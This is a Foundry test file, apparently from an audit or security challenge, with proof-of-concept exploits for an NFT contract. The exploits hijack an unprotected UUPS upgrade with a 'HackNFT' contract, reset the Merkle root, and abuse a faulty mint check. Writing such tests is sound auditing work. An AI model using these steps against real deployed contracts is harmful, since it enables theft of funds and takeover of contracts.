// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HackNFT} from "../src/HackNFT.sol";
import {Merkle} from "./murky/Merkle.sol";
import {HalbornNFT} from "../src/HalbornNFT.sol";

contract HalbornNFT_Test is Test, Merkle {
    HalbornNFT public nft;
    ERC1967Proxy public proxy;
    HalbornNFT public impl;

    function setUp() public {
        impl = new HalbornNFT();
        proxy = new ERC1967Proxy(address(impl), "");
        nft = HalbornNFT(address(proxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);
    }

    /*
    BUG 1: Anyone can upgrade the contract to a malicious contract. NO ACCESS CONTROL
     After upgrading to the malicious contract, 
     1. Price can be set to any value
     2. ETH can be stolen from the contract
    */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0x6969);
        vm.startPrank(unauthorizedUser);

        assertEq(nft.price(), 1 ether);

        HackNFT attack = new HackNFT();
        nft.upgradeTo(address(attack));

        // New price set
        nft.initialize("", 6969);

        assertEq(nft.price(), 6969);
    }

    // BUG 2: Anyone can set the merkle root. NO ACCESS CONTROL
    function test_setMerkelRoot() public {
        address unauthorizedUser = address(0x6969);
        vm.prank(unauthorizedUser);

        nft.setMerkleRoot(keccak256(abi.encodePacked("")));
        assertEq(nft.merkleRoot(), keccak256(abi.encodePacked("")));
    }

    // BUG 3: Inaccurate _exists check. 
    function test_setMintUnlimited() public {
        address unauthorizedUser = address(0x6969);
        vm.prank(unauthorizedUser);

        bytes32 left = keccak256(abi.encodePacked(address(this), uint256(1)));
        bytes32 right = keccak256(abi.encodePacked(address(this), uint256(2)));
        bytes32 root = hashLeafPairs(left, right);

        bytes32[] memory proofForLeft = new bytes32[](1);
        proofForLeft[0] = right;

        bytes32[] memory proofForRight = new bytes32[](1);
        proofForRight[0] = left;

        nft.setMerkleRoot(root);

        nft.mintAirdrops(1, proofForLeft);
        nft.mintAirdrops(2, proofForRight);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
